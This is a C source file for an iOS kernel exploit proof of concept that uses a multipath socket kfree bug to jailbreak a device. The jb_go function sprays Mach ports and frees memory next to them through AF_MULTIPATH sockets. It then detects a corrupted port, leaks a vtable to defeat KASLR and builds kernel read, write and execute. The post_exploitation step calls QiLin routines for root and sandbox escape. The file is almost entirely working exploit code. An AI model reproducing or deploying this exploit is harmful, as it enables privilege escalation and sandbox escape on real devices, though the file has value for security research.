//
//  jailbreak.c
//  multipath_kfree
//
//  Created by John Åkerblom on 6/1/18.
//  Copyright © 2018 kjljkla. All rights reserved.
//

#include "jailbreak.h"
#include "extra_recipe_utils.h"
#include "multipath_kfree.h"
#include "QiLin.h"

#include <sys/socket.h>
#include <sys/mman.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#ifndef AF_MULTIPATH
#define AF_MULTIPATH 39
#endif

#define MP_SOCK_COUNT 0x10
#define FIRST_PORTS_COUNT 100
#define REFILL_PORTS_COUNT 100
#define TOOLAZY_PORTS_COUNT 1000
#define REFILL_USERCLIENTS_COUNT 1000
#define MAX_PEEKS 30000

static void _init_port_with_empty_msg(mach_port_t port)
{
    uint8_t buf[256];
    memset(buf, 0x00, sizeof(buf));
    prepare_prealloc_port(port);
    send_prealloc_msg(port, (uint64_t *)buf, 30);
}

static int _is_port_corrupt(mach_port_t port)
{
    kern_return_t err;
    mach_port_seqno_t msg_seqno = 0;
    mach_msg_size_t msg_size = 0;
    mach_msg_id_t msg_id = 0;
    mach_msg_trailer_t msg_trailer; // NULL trailer
    mach_msg_type_number_t msg_trailer_size =  sizeof(msg_trailer);
    err = mach_port_peek(mach_task_self(),
                             port,
                             MACH_RCV_TRAILER_NULL,
                             &msg_seqno,
                             &msg_size,
                             &msg_id,
                             (mach_msg_trailer_info_t)&msg_trailer,
                             &msg_trailer_size);
    
    if (msg_id && (msg_id != 0x962)) {
        return 1;
    }
    
    return 0;
}


static int __readKernelMemory(uint64_t Address, uint64_t Len, void **To)
{
    void *mem = malloc(Len);
    kread(Address, mem, (int)Len);
    *To = mem;
    
    return (int)Len;
}

static int __writeKernelMemory(uint64_t Address, uint64_t Len, void *From)
{
    kwrite(Address, From, (int)Len);
    
    return (int)Len;
}

// This will not enable all QiLin features - but enough for us
void _init_tfp0less_qilin(uint64_t kaslr_shift)
{
    uint64_t kernproc = 0xfffffff0076450a8 + kaslr_shift;
    uint64_t *m = (uint64_t *)mmap((void *)0x110000000, 0x4000, PROT_READ | PROT_WRITE, MAP_FIXED | MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);
    
    *m = (uint64_t)__readKernelMemory;
    *(m + 1) = (uint64_t)__writeKernelMemory;
    *(m + 2) = kernproc;
}

void post_exploitation(uint64_t kernel_base, uint64_t kaslr_shift)
{
    // Do Electra/QiLin/Saurik/etc stuff here
    
    printf("Post-exploitation stage, you have kernel RWX with a clear API now (extra_recipe_utils.h) so put whatever you want here (let me spell it out for you Reddit: this === tfp0). There is no more exploitation of any vulnerabilities to be done, only mitigation bypasses of which all are public. I called this a PoC because of lack of offsets, elegant techniques, testing, reliability, documentation and so on, not because it does nothing");
    
    // kwx3(0xFFFFFFFF41414141, 0x111, 0x222, 0x333); // How to use API
    
    // Use Jonathan Levin's QiLin to elevate prvileges and escape sandbox.
    
    _init_tfp0less_qilin(kaslr_shift);
    initQiLin(0x1337, kernel_base);
    
    rootifyMe();
    ShaiHuludMe(0);
    
    printf("If all went well, sandbox escaped and root achieved now, test it if you want\n");
}

void jb_go(void)
{
    io_connect_t refill_userclients[REFILL_USERCLIENTS_COUNT];
    mach_port_t first_ports[FIRST_PORTS_COUNT];
    mach_port_t refill_ports[REFILL_PORTS_COUNT];
    mach_port_t toolazy_ports[TOOLAZY_PORTS_COUNT];
    mach_port_t corrupt_port = 0;
    uint64_t contained_port_addr = 0;
    uint8_t *recv_buf = NULL;
    uint8_t send_buf[1024];
    
    int mp_socks[MP_SOCK_COUNT];
    int prealloc_size = 0x660; // kalloc.4096
    int found = 0;
    int peeks = 0;
    
    for (int i = 0; i < 10000; ++i){
        prealloc_port(prealloc_size);
    }
    
    for (int i = 0; i < 0x20; ++i) {
        first_ports[i] = prealloc_port(prealloc_size);
    }
    
    mp_socks[0] = socket(39, SOCK_STREAM, 0);
    
    // multipath_kfree(mp_sock, 0xffffffff41414141); for (;;) sleep(1); // uncomment for basic POC

    for (int i = 0x20; i < FIRST_PORTS_COUNT; ++i) {
        first_ports[i] = prealloc_port(prealloc_size);
    }
    
    for (int i = 1; i < MP_SOCK_COUNT; ++i) {
        mp_socks[i] = socket(39, SOCK_STREAM, 0);
    }
    
    for (int i = 0; i < FIRST_PORTS_COUNT; ++i) {
        _init_port_with_empty_msg(first_ports[i]);
    }
    
    multipath_kfree_nearby_self(mp_socks[0], 0x0000 + 0x7a0);
    multipath_kfree_nearby_self(mp_socks[3], 0xe000 + 0x7a0);

    for (peeks = 0; peeks < MAX_PEEKS; ++peeks) {
        for (int i = 0 ; i < FIRST_PORTS_COUNT; ++i) {
            if (_is_port_corrupt(first_ports[i])) {
                corrupt_port = first_ports[i];
                printf("Corrupt port: %08X %d\n", corrupt_port, i);
                found = 1;
                break;
            }
        }
        
        if (found)
            break;
    }
    
    if (peeks >= MAX_PEEKS) {
        printf("Didn't find corrupt port");
        sleep(1);
        exit(0);
    }
    
    for (int i = 0; i < REFILL_PORTS_COUNT; ++i) {
        refill_ports[i] = prealloc_port(prealloc_size);
    }
    
    for (int i = 0; i < REFILL_PORTS_COUNT; ++i) {
        _init_port_with_empty_msg(refill_ports[i]);
    }

    recv_buf = (uint8_t *)receive_prealloc_msg(corrupt_port);
    
    contained_port_addr = *(uint64_t *)(recv_buf + 0x1C);
    printf("refill port is at %p\n", (void *)contained_port_addr);
    
    memset(send_buf, 0, sizeof(send_buf));
    send_prealloc_msg(corrupt_port, (uint64_t *)send_buf, 30);
    
    multipath_kfree(contained_port_addr);
    
    for (;;) {
        if (_is_port_corrupt(corrupt_port)) {
            break;
        }
    }
    
    for (int i = 0; i < REFILL_USERCLIENTS_COUNT; ++i) {
        refill_userclients[i] = alloc_userclient();
    }
    
    recv_buf = (uint8_t *)receive_prealloc_msg(corrupt_port);
    
    uint64_t vtable = *(uint64_t *)(recv_buf + 0x14);
    uint64_t kaslr_shift = vtable - 0xfffffff006fdd978;
    printf("AGXCommandQueue vtable: %p\n", (void *)vtable);
    printf("kaslr shift: %p\n", (void *)kaslr_shift);
    
    // Out of everything not done properly in this POC, this is
    // not done properly the most
    mach_port_destroy(mach_task_self(), corrupt_port);
    for (int i = 0; i < TOOLAZY_PORTS_COUNT; ++i) {
        toolazy_ports[i] = prealloc_port(prealloc_size-0x28); // Not even really aligned because lazy
    }

    kx_setup(refill_userclients, toolazy_ports, kaslr_shift, contained_port_addr);
    
    uint64_t kernel_base = 0xfffffff007004000 + kaslr_shift;
    uint32_t val = kread32(kernel_base);
    
    printf("kernelbase DWORD: %08X\n", val);
    
    post_exploitation(kernel_base, kaslr_shift);
    
    printf("Done\n");
    for (;;)
        sleep(1);
}
